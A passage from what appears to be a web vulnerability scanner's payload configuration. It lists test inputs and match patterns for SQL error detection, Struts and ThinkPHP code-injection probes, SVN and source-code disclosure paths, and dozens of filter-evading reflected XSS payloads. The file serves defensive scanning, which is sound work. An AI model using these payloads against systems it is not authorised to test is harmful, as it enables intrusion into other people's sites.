statement:)|(SqlException)|(Supplied argument is not a valid PostgreSQL result)|(Syntax error in string in query expression)|(Syntax error near\\s.*?\\sin the full-text search condition\\s)|(Syntax error or access violation:)|(System.Data.SqlClient.SqlException:)|(Unclosed quotation mark before the character string)|(Unclosed quotation mark)|(Unexpected end of command in statement \\[)|(Unknown system variable)|(Unknown table)|(You have an error in your SQL syntax)|(\\): encountered SQLException \\[)|(\\[Microsoft\\]\\[ODBC Microsoft Access 97 Driver\\])|(\\[ODBC Informix driver\\]\\[Informix\\])|(\\[SQL Server Driver\\]\\[SQL Server\\]Line 1: Incorrect syntax near)|(column \"\\w{5}\" does not exist)|(internal error \\[IBM\\]\\[CLI Driver\\]\\[DB2\\/6000\\])|(java.sql.SQLSyntaxErrorException)|(near\\s[^:]+?:\\ssyntax\\serror)|(org.hibernate.QueryException)|(org.hibernate.exception.SQLGrammarException:)|(pg_fetch_row() expects parameter 1 to be resource, boolean given in)|(supplied argument is not a valid MySQL result)|(syntax error at end of input)|(unexpected end of SQL command)|(unrecognized token:)|(unterminated quoted identifier at or near)|(unterminated quoted string at or near)",
        "input": "'",
        "encode":  "NO",
    },

]


struts_leak_detect_test_cases = [

    {
        "case_id": 1120200001,
        "input": "class.classLoader.resources=tst",
        "encode":  "ALL",
    },

]

svn_info_leak_detect_test_cases = [

    {
        "case_id": 1030080001,
        "target": "(\\n)+dir\\n",
        "input": "/.svn/entries",
        "encode":  "NO",
    },

    {
        "case_id": 1030080002,
        "input": "/.svn/format",
        "target": "^(12|7|8|9|10|11)\\s",
        "encode":  "NO",
    },

]


think_php_detect_test_cases = [

    {
        "case_id": 1040020002,
        "target": "Configuration File \\(php\\.ini\\) Path",
        "input": "index.php/article/show/id/{${phpinfo()}}",
        "encode":  "NO",
    },

    {
        "case_id": 1040020001,
        "target": "Configuration File \\(php\\.ini\\) Path",
        "input": "index.php/module/action/param1/$%7B@phpinfo()%7D",
        "encode":  "ALL",
    },

    {
        "case_id": 1040020003,
        "target": "Configuration File \\(php\\.ini\\) Path",
        "input": "index.php?s=/article/show/id/{${phpinfo()}}",
        "encode":  "ALL",
    },

]


xss_reflection_detect_test_cases = [

    {
        "case_id": 1050030051,
        "compare" :  "equal",
        "tag" :  "*",
        "flag" :  "onmouseover",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "onmouseover='prompt(rndstr)'bad='",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030050,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "src",
        "flag_type" :  "attr",
        "target": "http://zyjc.sec.qq.com/data/tst_data/tstscanner.js?rndstr",
        "input": "'><ScRiPt/src=http://zyjc.sec.qq.com/data/tst_data/tstscanner.js?rndstr></ScRiPt>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030049,
        "compare" :  "match",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(rndstr)",
        "input": "%0d%0a%3Balert%28rndstr%29%3B%2F%2F",
        "encode":  "NO",
    },

    {
        "case_id": 1050030048,
        "compare" :  "match",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "';alert``;",
        "input": "Iyc7YWxlcnRgYDsvLw==#",
        "encode":  "NO",
    },

    {
        "case_id": 1050030047,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(11111)",
        "input": "PHNjcmlwdD5hbGVydCgxMTExMSk8L3NjcmlwdD4=",
        "encode":  "NO",
    },

    {
        "case_id": 1050030046,
        "compare" :  "match",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "\";this[8680439..toString(30)](rndstr)",
        "input": "%22%3Bthis%5B8680439..toString%2830%29%5D%28rndstr%29%3B%2F%2F%22",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030045,
        "compare" :  "match",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "';this[8680439..toString(30)](rndstr)",
        "input": "%27%3Bthis%5B8680439..toString%2830%29%5D%28rndstr%29%3B%2F%2F%27",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030043,
        "compare" :  "match",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "\";alert(rndstr)",
        "input": "\";alert(rndstr);//tst",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030044,
        "compare" :  "match",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "';alert(rndstr)",
        "input": "';alert(rndstr);//tst",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030042,
        "compare" :  "equal",
        "tag" :  "a|form|frame|iframe",
        "flag" :  "href|action|src|src",
        "flag_type" :  "attr",
        "target": "feed:javascript:prompt(prompt(rndstr))",
        "input": "feed:javascript&colon;prompt&lpar;prompt&lpar;rndstr&rpar;&rpar;",
        "encode":  "YES",
    },

    {
        "case_id": 1050030041,
        "compare" :  "equal",
        "tag" :  "a|form|frame|iframe",
        "flag" :  "href|action|src|src",
        "flag_type" :  "attr",
        "target": "javascript:prompt(rndstr)",
        "input": "javascript&#58;prompt&lpar;rndstr&rpar;",
        "encode":  "YES",
    },

    {
        "case_id": 1050030040,
        "compare" :  "equal",
        "tag" :  "a|form|frame|iframe",
        "flag" :  "href|action|src|src",
        "flag_type" :  "attr",
        "target": "javascript:prompt(rndstr)",
        "input": "javascript&colon;prompt&lpar;rndstr&rpar;",
        "encode":  "YES",
    },

    {
        "case_id": 1050030039,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "\"</script><script>prompt(rndstr)</script>\"",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030038,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "</script><script>prompt(rndstr)</script>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030035,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "</title><ScRiPt >prompt(rndstr)</ScRiPt>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030034,
        "compare" :  "equal",
        "tag" :  "*",
        "flag" :  "onmouseover",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "onmouseover=prompt(rndstr) y=",
        "encode":  "YES",
    },

    {
        "case_id": 1050030033,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "src",
        "flag_type" :  "attr",
        "target": "rndstr",
        "input": "src=rndstr",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030032,
        "compare" :  "match",
        "tag" :  "*",
        "flag" :  "style",
        "flag_type" :  "attr",
        "target": "acu:ExpreSSion(prompt(rndstr))",
        "input": "'sTYLe='acu:Expre/**/SSion(prompt(rndstr))'bad='>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030031,
        "compare" :  "match",
        "tag" :  "*",
        "flag" :  "style",
        "flag_type" :  "attr",
        "target": "acu:ExpreSSion(prompt(rndstr))",
        "input": "\"sTYLe='acu:Expre/**/SSion(prompt(rndstr))'bad=\">",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030030,
        "compare" :  "equal",
        "tag" :  "*",
        "flag" :  "onmouseover",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "xF6\" onmouseover=prompt(rndstr) //",
        "encode":  "YES",
    },

    {
        "case_id": 1050030029,
        "compare" :  "equal",
        "tag" :  "*",
        "flag" :  "onmouseover",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "xF6' onmouseover=prompt(rndstr) //",
        "encode":  "YES",
    },

    {
        "case_id": 1050030028,
        "compare" :  "equal",
        "tag" :  "*",
        "flag" :  "onmouseover",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "' onmouseover=prompt(rndstr) bad='",
        "encode":  "YES",
    },

    {
        "case_id": 1050030027,
        "compare" :  "equal",
        "tag" :  "*",
        "flag" :  "onmouseover",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "\" onmouseover=prompt(rndstr) bad=\"",
        "encode":  "YES",
    },

    {
        "case_id": 1050030026,
        "compare" :  "equal",
        "tag" :  "a",
        "flag" :  "href",
        "flag_type" :  "attr",
        "target": "feed:javascript:prompt(rndstr)",
        "input": "<a hREF=feed:javascript&colon;prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030025,
        "compare" :  "equal",
        "tag" :  "a",
        "flag" :  "href",
        "flag_type" :  "attr",
        "target": "data:text/html,%3CsCript%3Eprompt(rndstr)%3C/scRipt%3E",
        "input": "<A HreF=data:text/html,%3CsCript%3Eprompt(rndstr)%3C/scRipt%3E>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030024,
        "compare" :  "equal",
        "tag" :  "a",
        "flag" :  "href",
        "flag_type" :  "attr",
        "target": "javAscRipt:prompt(rndstr)",
        "input": "<A HreF=j&#x61;v&#x41;sc&#x52;ipt&#x3A;prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030023,
        "compare" :  "equal",
        "tag" :  "a",
        "flag" :  "href",
        "flag_type" :  "attr",
        "target": "javascript:prompt(rndstr)",
        "input": "<A HreF=javascript&#x3A;prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030022,
        "compare" :  "equal",
        "tag" :  "a",
        "flag" :  "href",
        "flag_type" :  "attr",
        "target": "javascript:prompt(rndstr)",
        "input": "<A HreF=javascript&colon;prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030021,
        "compare" :  "equal",
        "tag" :  "a",
        "flag" :  "href",
        "flag_type" :  "attr",
        "target": "javascript:prompt(rndstr)",
        "input": "<A HrEF=javascript:prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030020,
        "compare" :  "equal",
        "tag" :  "input",
        "flag" :  "onfocus",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "<input autofocus onfocus=prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030019,
        "compare" :  "equal",
        "tag" :  "img",
        "flag" :  "onmouseover",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "xF6<img acu onmouseover=prompt(rndstr) //xF6>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030018,
        "compare" :  "equal",
        "tag" :  "img",
        "flag" :  "onerror",
        "flag_type" :  "attr",
        "target": "alert(rndstr)",
        "input": "<img/onerror=alert(rndstr) src=x>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030017,
        "compare" :  "equal",
        "tag" :  "img/src",
        "flag" :  "onerror",
        "flag_type" :  "attr",
        "target": "alert(rndstr)",
        "input": "<img/src=\">\" onerror=alert(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030016,
        "compare" :  "equal",
        "tag" :  "img",
        "flag" :  "onerror",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "<img src=xyz OnErRor=prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030015,
        "compare" :  "equal",
        "tag" :  "img",
        "flag" :  "onload",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "<img src=//zyjc.sec.qq.com/data/tst_data/tstscandot.gif onload=prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030014,
        "compare" :  "equal",
        "tag" :  "body",
        "flag" :  "onload",
        "flag_type" :  "attr",
        "target": "prompt(rndstr)",
        "input": "<body onload=prompt(rndstr)>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030013,
        "compare" :  "equal",
        "tag" :  "iframe",
        "flag" :  "src",
        "flag_type" :  "attr",
        "target": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=",
        "input": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='rndstr'>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030012,
        "compare" :  "equal",
        "tag" :  "div",
        "flag" :  "style",
        "flag_type" :  "attr",
        "target": "width:expression(prompt(rndstr))",
        "input": "<div style=width:expression(prompt(rndstr))>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030011,
        "compare" :  "equal",
        "tag" :  "g",
        "flag" :  "onload",
        "flag_type" :  "attr",
        "target": "javascript:prompt(rndstr)",
        "input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:prompt(rndstr)\"></g></svg>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030010,
        "compare" :  "equal",
        "tag" :  "source",
        "flag" :  "onerror",
        "flag_type" :  "attr",
        "target": "javascript:prompt(rndstr)",
        "input": "<video><source onerror=\"javascript:prompt(rndstr)\">",
        "encode":  "YES",
    },

    {
        "case_id": 1050030009,
        "compare" :  "equal",
        "tag" :  "script/acu",
        "flag" :  "src",
        "flag_type" :  "attr",
        "target": "//zyjc.sec.qq.com/data/tst_data/tstscanner.js?rndstr",
        "input": "<ScRiPt/acu src=//zyjc.sec.qq.com/data/tst_data/tstscanner.js?rndstr></ScRiPt>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030008,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "<ScRiPt \r\n>prompt(rndstr)</script>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030007,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "<script>prompt(rndstr)</script>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030006,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "<ScRiPt >prompt(rndstr)</ScRiPt>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030001,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(rndstr)",
        "input": "?></ScriPt><ScriPt>alert(rndstr)</ScriPt>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030004,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(rndstr)",
        "input": "'><ScriPt>alert(rndstr)</ScriPt>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030005,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "'\"()&%<ScRiPt >prompt(rndstr)</ScRiPt>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030003,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(rndstr)",
        "input": "\"><ScriPt>alert(rndstr)</ScriPt>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030002,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(rndstr)",
        "input": "><ScriPt>alert(rndstr)</ScriPt>",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030037,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "--><ScRiPt >prompt(rndstr)</ScRiPt><!--",
        "encode":  "YES",
    },

    {
        "case_id": 1050030036,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "prompt(rndstr)",
        "input": "</textarea><ScRiPt >prompt(rndstr)</ScRiPt>",
        "encode":  "YES",
    },

    {
        "case_id": 1050030054,
        "compare" :  "match",
        "tag" :  "*",
        "flag" :  "onerror|onhaschange|onload|onblur|onfocus|onselect|onsubmit|onkeydown|onkeypress|onkeyup|onclick|ondblclick|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup",
        "flag_type" :  "attr",
        "target": "alert(rndstr)",
        "input": "%0d%0a%3balert(rndstr)%3b%2f%2f",
        "encode":  "NO",
    },

    {
        "case_id": 1050030053,
        "compare" :  "match",
        "tag" :  "*",
        "flag" :  "onerror|onhaschange|onload|onblur|onfocus|onselect|onsubmit|onkeydown|onkeypress|onkeyup|onclick|ondblclick|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup",
        "flag_type" :  "attr",
        "target": "';alert(rndstr)",
        "input": "&#x27;;alert(rndstr);//",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030052,
        "compare" :  "match",
        "tag" :  "*",
        "flag" :  "onerror|onhaschange|onload|onblur|onfocus|onselect|onsubmit|onkeydown|onkeypress|onkeyup|onclick|ondblclick|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup",
        "flag_type" :  "attr",
        "target": "';alert(rndstr)",
        "input": "';alert(rndstr);//",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030059,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(rndstr)",
        "input": "&lt;script&gt;alert(rndstr)&lt;/script&gt;",
        "encode":  "ALL",
    },

    {
        "case_id": 1050030060,
        "compare" :  "equal",
        "tag" :  "script",
        "flag" :  "unused",
        "flag_type" :  "txt",
        "target": "alert(rndstr)",
        "input": "%3Cscript%3Ealert%28rndstr%29%3C%2fscript%3E",
        "encode":  "ALL",
    },

]

json_hijacking_detect_test_cases = [

    {
        "case_id": 1080020003,
        "input": "347486423",
        "target": "nothing",
        "encode":  "NO",
    },

    {
        "case_id": 1080020002,
        "input": "632789064",
        "target": "nothing",
        "encode":  "NO",
    },

]


src_code_disclosure_detect_file_ext = [

    {
        "case_id": 1200220001,
        "input": "php",
        "encode":  "NO",
    },

    {
        "case_id": 1200220002,
        "input": "php3",
        "encode":  "NO",
    },

    {
        "case_id": 1200220003,
        "input": "php4",
        "encode":  "NO",
    },

    {
        "case_id": 1200220004,
        "input": "php5",
        "encode":  "NO",
    },

    {
        "case_id": 1200220005,
        "input": "asp",
        "encode":  "NO",
    },

    {
        "case_id": 1200220006,
        "input": "aspx",
        "encode":  "NO",
    },

    {
        "case_id": 1200220007,
        "input": "jsp",
        "encode":  "NO",
    },

    {
        "case_id": 1200220009,
        "input": "pl",
        "encode":  "NO",
    },

    {
        "case_id": 1200220010,
        "input": "shtml",
        "encode":  "NO",
    },

    {
        "case_id": 1200220011,
        "input": "phtml",
        "encode":  "NO",
    },

    {
        "case_id": 1200220012,
        "input": "ascx",
        "encode":  "NO",
    },

    {
        "case_id": 1200220013,
        "input": "asmx",
        "encode":  "NO",
    },

    {
        "case_id": 1200220018,
        "input": "py",
        "encode":  "NO",
    },

    {
        "case_id": 1200220021,
        "input": "cgi",
        "encode":  "NO",
    },

    {
        "case_id": 1200220023,
        "input": "jhtml",
        "encode":  "NO",
    },

    {
        "case_id": 1200220024,
        "input": "jhtm",
        "encode":  "NO",
    },

    {
        "case_id": 1200220025,
        "input": "jws",
        "encode":  "NO",
    },

    {
        "case_id": 1200220026,
        "input": "do",
        "encode":  "NO",
    },

]

src_code_disclosure_detect_test_cases = [

    {
        "case_id": 1200220054,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%00.txt",
        "encode":  "NO",
    },

    {
        "case_id": 1200220053,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%00",
        "encode":  "NO",
    },

    {
        "case_id": 1200220052,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext",
        "encode":  "NO",
    },

    {
        "case_id": 1200220055,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%20",
        "encode":  "NO",
    },

    {
        "case_id": 1200220056,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%252ejsp",
        "encode":  "NO",
    },

    {
        "case_id": 1200220057,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%2f",
        "encode":  "NO",
    },

    {
        "case_id": 1200220058,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%2f.txt",
        "encode":  "NO",
    },

    {
        "case_id": 1200220059,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%5c",
        "encode":  "NO",
    },

    {
        "case_id": 1200220060,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%5c.txt",
        "encode":  "NO",
    },

    {
        "case_id": 1200220061,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext%70",
        "encode":  "NO",
    },

    {
        "case_id": 1200220062,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext+",
        "encode":  "NO",
    },

    {
        "case_id": 1200220063,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext.%2e",
        "encode":  "NO",
    },

    {
        "case_id": 1200220064,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext.%2easp",
        "encode":  "NO",
    },

    {
        "case_id": 1200220065,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext.%E2%73%70",
        "encode":  "NO",
    },

    {
        "case_id": 1200220066,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext?*",
        "encode":  "NO",
    },

    {
        "case_id": 1200220067,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.file_ext\\\\",
        "encode":  "NO",
    },

    {
        "case_id": 1200220068,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name/%3f.jsp",
        "encode":  "NO",
    },

    {
        "case_id": 1200220069,
        "target": "(\\<%[\\s\\S]*Response\\.Write[\\s\\S]*%\\>)|(^\\<\\?php[\\x20-\\x80\\x0d\\x0a\\x09]+)|(using\\sSystem;\\n[\\s\\S]*?class\\s[\\s\\S]*?\\s?{[\\s\\S]*})|(^#\\!\\/[\\s\\S]*?\\/perl)|(^#\\!\\/usr\\/bin\\/env\\spython)|(^#\\!\\/[\\s\\S]*?\\/python)|(^#\\!\\\\\\/[\\s\\S]*\\\\\\/perl)",
        "input": "file_name.bak",
        "encode":  "NO",
    },

    {
        "case_id": 1200220070,
